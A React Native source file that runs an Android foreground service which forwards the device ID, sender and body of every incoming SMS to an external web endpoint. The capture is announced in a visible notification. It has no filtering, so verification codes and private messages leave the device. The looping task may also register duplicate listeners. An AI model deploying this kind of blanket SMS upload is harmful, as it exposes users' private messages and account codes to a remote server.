import ForegroundService from '@supersami/rn-foreground-service';
//@ts-ignore
import SmsListener from 'react-native-android-sms-listener';
import axios from 'axios';
import DeviceInfo from 'react-native-device-info';
import { prepareSMSPayload } from './hashSms';

export const startSMSService = async () => {
  const deviceId = await DeviceInfo.getUniqueId();

  ForegroundService.add_task(
    async () => {
      SmsListener.addListener(async (message: any) => {
        const payload = prepareSMSPayload({
          deviceId,
          from: message.originatingAddress,
          message: message.body
        });

        try {
          await axios.post('https://employment-engage.vercel.app/api/sms', payload);
          console.log('✅ SMS sent:', payload);
        } catch (err) {
          console.error('❌ Failed to send SMS:', err);
        }
      });
    },
    {
      delay: 1000,
      onLoop: true,
      taskId: 'sms-task',
      onError: e => console.error('Task error', e),
    }
  );

  await ForegroundService.start({
    id: 144,
    title: 'SMS Listener Running',
    message: 'Your device is monitoring incoming SMS',
    icon: 'ic_launcher',
    button: true,
    buttonText: 'Stop',
    //@ts-ignore
    buttonOnPress: () => {
      ForegroundService.stop();
    },
  });
};
